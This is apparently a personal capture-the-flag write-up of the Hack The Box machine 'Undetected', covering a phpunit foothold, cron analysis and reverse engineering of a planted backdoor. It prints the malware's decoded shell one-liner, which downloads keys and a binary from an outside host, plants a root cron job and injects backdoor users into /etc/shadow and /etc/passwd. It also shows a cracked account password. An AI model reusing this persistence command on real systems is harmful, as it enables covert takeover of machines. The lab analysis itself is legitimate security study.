# Undetected - Linux
Difficulty: 
Tags: 
Type: Linux

## Enumeration 
- Portscan 
```bash
# ports 22 and 80 are open
```
- Dirscan 
```bash
301      GET        9l       28w      325c http://store.djewelry.htb/images => http://store.djewelry.htb/images/
200      GET      195l      475w     6215c http://store.djewelry.htb/index.php
200      GET      229l      550w     7447c http://store.djewelry.htb/products.php
200      GET      122l      337w     4129c http://store.djewelry.htb/login.php
200      GET      134l      354w     4396c http://store.djewelry.htb/cart.php
301      GET        9l       28w      322c http://store.djewelry.htb/css => http://store.djewelry.htb/css/
301      GET        9l       28w      321c http://store.djewelry.htb/js => http://store.djewelry.htb/js/
301      GET        9l       28w      325c http://store.djewelry.htb/vendor => http://store.djewelry.htb/vendor/
301      GET        9l       28w      329c http://store.djewelry.htb/vendor/bin => http://store.djewelry.htb/vendor/bin/
301      GET        9l       28w      324c http://store.djewelry.htb/fonts => http://store.djewelry.htb/fonts/
301      GET        9l       28w      334c http://store.djewelry.htb/vendor/composer => http://store.djewelry.htb/vendor/composer/
200      GET       19l      168w     1068c http://store.djewelry.htb/vendor/composer/LICENSE
301      GET        9l       28w      334c http://store.djewelry.htb/vendor/doctrine => http://store.djewelry.htb/vendor/doctrine/
ðŸš¨ Caught ctrl+c ðŸš¨ saving scan state to ferox-http_store_djewelry_htb-1645333977.state ...
[###>----------------] - 30m  1307999/7939620 2h      found:13      errors:18946  
[###>----------------] - 30m   174812/882180  95/s    http://store.djewelry.htb 
[###>----------------] - 30m   174784/882180  95/s    http://store.djewelry.htb/images 
[###>----------------] - 30m   172864/882180  94/s    http://store.djewelry.htb/css 
[###>----------------] - 30m   170340/882180  94/s    http://store.djewelry.htb/js 
[###>----------------] - 30m   167792/882180  93/s    http://store.djewelry.htb/vendor 
[###>----------------] - 29m   166684/882180  93/s    http://store.djewelry.htb/vendor/bin 
[###>----------------] - 29m   163760/882180  92/s    http://store.djewelry.htb/fonts 
[##>-----------------] - 21m   109840/882180  83/s    http://store.djewelry.htb/vendor/composer 
[#>------------------] - 13m    52796/882180  64/s    http://store.djewelry.htb/vendor/doctrine 

```
- Possible usernames
![[Pasted image 20220220083449.png]]
- Found a virtual host store.djewelry.htb from the top nav bar on the website's landing page
![[Pasted image 20220220101510.png]]
 - phpunit is a unit testing framework for php and it has some serious vulnerabilities
 ![[Pasted image 20220220160518.png]]
 - got php code execution
![[Pasted image 20220220161425.png]]
- trying to get a reverse shell from here.
![[Pasted image 20220220161956.png]]
- Command execution works 
- Got a reverse shell 
![[Pasted image 20220220162355.png]]
## Privilege Escalation
- Found something interesting in `cronjobs`
```
www-data@production:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* 3 * * * root /var/lib/.main
```
- there's some weird executable inside /var/backups owned by www-data
```bash
www-data@production:/var/backups$ file info
info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
www-data@production:/var/backups$ ./info
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[-] substring 'ffff' not found in dmesg
www-data@production:/var/backups$
```
- Looks like an output from a failed kernel exploit https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c
- Copied the `info` binary to my own machine to analyse it 
- found a hash-type thing from `strings info`
![[Pasted image 20220220182327.png]]
- Decoded version of that hash-type thing, it wasn't actually an hash just an hex encoded output 
```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```
- BUT I found an hash inside of this output though
- used JohnTheRipper to crack this hash, apparently it was being added to /etc/shadow file so, 
```bash
echo "steven:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::" > shadow.txt
# copy the steven line from /etc/passwd file 
unshadow shadow.txt passwd.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyout.txt passwords.txt
```
```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/undetected]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (steven)     
1g 0:00:00:52 DONE (2022-02-20 08:05) 0.01905g/s 1697p/s 1697c/s 1697C/s jojo95..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- Got the password for steven's account using it to logging into SSH
- that didn't work on steven but did work on steven1 account
- okay so it looks like the `.main` binary actually executes the input we give it as a bash command 
- But, according to the cronjob root must be running that binary but if I try to do 'id' after executing that binary then it returns 'steven' id. 
- `/usr/sbin/sshd` file is beign created after the execution of the .main file 
	- there's a function `auth_password` which contains a backdoor
- 